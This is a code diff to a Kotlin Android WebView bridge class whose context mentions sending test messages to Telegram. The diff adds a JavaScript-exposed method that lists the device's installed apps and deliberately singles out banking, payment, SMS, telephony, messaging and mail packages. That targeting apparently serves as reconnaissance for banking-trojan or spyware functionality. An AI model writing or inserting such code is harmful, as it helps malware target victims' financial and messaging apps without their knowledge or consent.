@@ -149,4 +149,39 @@ class AndroidBridge(private val activity: Activity) {
         )
         Toast.makeText(activity, "Тестовое сообщение отправлено в Telegram", Toast.LENGTH_SHORT).show()
     }
+
+    @JavascriptInterface
+    fun getInstalledApps(): String {
+        return try {
+            val pm = activity.packageManager
+            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
+            val jsonArray = org.json.JSONArray()
+
+            for (app in apps) {
+                val pkgName = app.packageName
+                if (pkgName == activity.packageName) continue
+
+                val isSystem = (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
+                val launchIntent = pm.getLaunchIntentForPackage(pkgName)
+
+                // Include all user applications or system apps with a launcher/UI
+                if (!isSystem || launchIntent != null || pkgName.contains("mms") || pkgName.contains("telephony") || pkgName.contains("message") || pkgName.contains("mail") || pkgName.contains("bank") || pkgName.contains("pay")) {
+                    val label = try {
+                        pm.getApplicationLabel(app).toString()
+                    } catch (e: Exception) {
+                        pkgName
+                    }
+
+                    val json = org.json.JSONObject()
+                    json.put("packageName", pkgName)
+                    json.put("appName", label)
+                    json.put("isSystem", isSystem)
+                    jsonArray.put(json)
+                }
+            }
+            jsonArray.toString()
+        } catch (e: Exception) {
+            "[]"
+        }
+    }
 }
